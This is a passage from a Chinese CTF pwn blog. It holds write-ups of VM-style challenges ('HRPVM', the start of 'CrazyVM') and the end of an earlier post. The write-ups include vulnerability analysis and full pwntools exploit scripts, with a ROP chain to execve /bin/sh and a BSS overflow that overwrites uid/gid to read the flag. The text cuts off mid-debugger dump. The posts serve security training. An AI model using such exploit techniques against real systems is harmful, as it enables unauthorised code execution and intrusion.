class="number">1</span>-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  pwn(pop_rsi_ret)</span><br><span class="line">  pwn(stack_addr+<span class="number">0x80</span>)</span><br><span class="line">  pwn(mov_rdx_256_ret)</span><br><span class="line">  pwn(mov_rax_n1_ret)</span><br><span class="line">  pwn(add_rax_1_ret)</span><br><span class="line">  pwn(pop_rcx_ret)</span><br><span class="line">  pwn(binsh_addr)</span><br><span class="line">  pwn(pop_rcx_ret)</span><br><span class="line">  pwn(syscall_ret)</span><br><span class="line">  pwn(mov_rdi_rbx_call_rcx)</span><br><span class="line"></span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">  payload = p64(pop_rax_ret)+p64(<span class="number">59</span>)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">  sla(<span class="string">&quot;22222222222222222222222222222222&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">      p = process(challenge)</span><br><span class="line">      <span class="comment">#p = gdb.debug(challenge, cmd)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    exp()</span><br><span class="line">    sla(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    flag = p.recvline()</span><br><span class="line">    success(<span class="string">&quot;flag &gt;&gt; &quot;</span>+flag)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+bss溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-24 09:45:44 / Modified: 09:48:30" itemprop="dateCreated datePublished" datetime="2023-06-24T09:45:44+08:00">2023-06-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>vmbyhrp</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HRPVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ae19ec35e351cd7e0113b04270566c04bd3bd321, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 DEBUG 命令中有读取任意文件的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;FILE NAME:&quot;</span>);</span><br><span class="line">name = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, name, <span class="number">0x20</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)name);</span><br><span class="line">stream = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_fscanf(stream, <span class="string">&quot;%c&quot;</span>, &amp;data[i]) != <span class="number">-1</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  HF[file_count].fd = global_fd;</span><br><span class="line">  HF[file_count].name = (<span class="keyword">char</span> *)name;</span><br><span class="line">  HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">  count = file_count;</span><br><span class="line">  HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)HF[file_count].data, data, <span class="number">0x1000</span>uLL);</span><br><span class="line">  ++file_count;</span><br><span class="line">  ++global_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>DEBUG 命令需要覆盖 gid 和 uid</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(system_cmd[<span class="number">6</span>], (<span class="keyword">const</span> <span class="keyword">char</span> *)buf, len) &amp;&amp; !gid &amp;&amp; !uid )<span class="comment">// debug</span></span><br><span class="line">  DEBUG();</span><br></pre></td></tr></table></figure>
<p>全局变量 <code>file_count</code> 没有限制大小，导致 <code>HF</code> 可以向下溢出到 gid 和 uid</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HF[file_count].fd = global_fd;</span><br><span class="line">HF[file_count].name = name;</span><br><span class="line">HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">count = file_count;</span><br><span class="line">HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FILE CONTENT: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)HF[file_count].data, <span class="number">0x1000</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)HF[file_count].data);</span><br><span class="line">++file_count;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>使用如下两个脚本并配合溢出可以很轻松地覆盖 gid 和 uid：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br></pre></td></tr></table></figure>
<p>但 DEBUG 退出时会置空全局变量 <code>dest</code> 导致后续程序触发段错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deleEnter(buf);</span><br><span class="line">gid = <span class="number">1000</span>;</span><br><span class="line">uid = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(dest, src, <span class="number">8uLL</span>);</span><br><span class="line">machine_start();</span><br></pre></td></tr></table></figure>
<p>在 <code>login_system</code> 函数中可以往全局变量 <code>dest</code> 中写入数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;[+]HOLDER:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, dest, <span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>
<p>在 mmap 命令中可以使用 mmap 创建一片合法的空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(debug_cmd[<span class="number">4</span>], buf, len) )     <span class="comment">// mmap</span></span><br><span class="line">&#123;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;addr);</span><br><span class="line">  mmap(addr, <span class="number">0x400</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>于是我们可以在 DEBUG 使用 mmap 指令创建合法空间，然后 reboot 调用 <code>login_system</code> 并写入合法空间，这样就不会发生段错误了</p>
<p>剩下的操作就是程序的正常功能，完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./HRPVM&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x248E)\nb *$rebase(0x220B)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;./&quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,data</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;file&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;FILE NAME: &quot;</span>,name)</span><br><span class="line">    sla(<span class="string">&quot;FILE CONTENT: &quot;</span>,data)   </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">name</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;rm &quot;</span>+name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,<span class="string">&quot;YHELLOW&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">payload3 =  <span class="string">&quot;mov rdi,36;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rsi,1001;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload3 += <span class="string">&quot;call open,2;&quot;</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;write&quot;</span>,payload)</span><br><span class="line">add(<span class="string">&quot;open&quot;</span>,payload2)</span><br><span class="line">add(<span class="string">&quot;open2&quot;</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">29</span>):</span><br><span class="line">    add(<span class="built_in">str</span>(i),<span class="string">&quot;1111&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;file input&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;FILE NAME:&quot;</span>,<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;mmap&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x560000000000</span>))</span><br><span class="line">sla(<span class="string">&quot;[+][DEBUGING]root#&quot;</span>,<span class="string">&quot;exit&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&quot;HRP-MACHINE$ &quot;</span>,<span class="string">&quot;reboot&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;USER NAME:&quot;</span>,<span class="string">&quot;HRPHRP&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;PASSWORD:&quot;</span>,<span class="string">&quot;PWNME&quot;</span>)</span><br><span class="line">sla(<span class="string">&quot;[+]HOLDER:&quot;</span>,p64(<span class="number">0x560000000000</span>))</span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;open2&quot;</span>)</span><br><span class="line">pwn(<span class="string">&quot;write&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/22/VM%20pwn+exit_hook%E5%8A%AB%E6%8C%81+mmap%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/22/VM%20pwn+exit_hook%E5%8A%AB%E6%8C%81+mmap%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+exit_hook劫持+mmap溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-22 03:15:19 / Modified: 03:17:48" itemprop="dateCreated datePublished" datetime="2023-06-22T03:15:19+08:00">2023-06-22</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>CrazyVM</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.31</span><span class="number">-0u</span>buntu9<span class="number">.2</span>)</span> stable release version 2.31</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CrazyVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=db8e268984b1b742f3813cdb5662ef47af09628d, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>程序分析</strong></p>
<p>首先程序没法控制 malloc free 应该不是打堆，Full RELRO 打不了 GOT 表，另外程序也没有一些特殊字符串和类似于 strcmp 之类的函数</p>
<p>上述这些特点说明：本程序需要逆向虚拟机指令格式，猜测应该是自定义了一个虚拟机指令格式，我们需要逆向该指令格式并找到漏洞（漏洞点极有可能是溢出）</p>
<ul>
<li>虚拟机有两种实现方式：<ul>
<li>一种是将虚拟机字节码翻译为 ELF 指令，然后交给 CPU 运行（这种通常要打 shellcode）</li>
<li>一种是在虚拟机内部实现各个指令的函数，通过这些函数模拟指令执行的过程（这种通常要注意溢出漏洞）</li>
</ul>
</li>
</ul>
<p>随便输入点数据试试程序结构：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">code = <span class="string">&quot;1111&quot;</span></span><br><span class="line">data = <span class="string">&quot;2222&quot;</span></span><br><span class="line">sla(<span class="string">&quot;input code for vm: &quot;</span>,code)</span><br><span class="line">sla(<span class="string">&quot;input data for vm: &quot;</span>,data)</span><br></pre></td></tr></table></figure>
<p>在 GDB 中调试分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x55d73e8fe290</span>      <span class="number">0x0</span>                 <span class="number">0x170</span>		<span class="comment">/* info */</span></span><br><span class="line"><span class="number">0x55d73e8fe400</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>		<span class="comment">/* node */</span></span><br><span class="line"><span class="number">0x55d73e8fe420</span>      <span class="number">0x55d73e8fe430</span>      <span class="number">0x10010</span> 	<span class="comment">/* data */</span></span><br><span class="line"><span class="number">0x55d73e90e430</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>		<span class="comment">/* node */</span>   </span><br><span class="line"><span class="number">0x55d73e90e450</span>      <span class="number">0x7fa93f84f010</span>      <span class="number">0x20</span> 		<span class="comment">/* node */</span>               </span><br></pre></td></tr></table></figure>
<ul>
<li>整体堆布局：核心控制信息 info，3个次要信息 node，1个缓冲区</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55d73e8fe2a0</span> <span class="comment">/* INFO */</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rdi <span class="number">0x55d73e8fe2a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓            <span class="number">7</span> skipped</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x55d73e8fe2e0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓     <span class="number">7</span> skipped</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x55d73e8fe320</span> ◂— <span class="number">0x7f00000000080000</span></span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x55d73e8fe328</span> ◂— <span class="number">0x7f00000000080000</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x55d73e8fe330</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x55d73e8fe338</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">14</span>:<span class="number">00</span>a0│  <span class="number">0x55d73e8fe340</span> —▸ <span class="number">0x55d73e8fe410</span> ◂— <span class="number">0x0</span> <span class="comment">/* NODE-code */</span></span><br><span class="line"><span class="number">15</span>:<span class="number">00</span>a8│  <span class="number">0x55d73e8fe348</span> —▸ <span 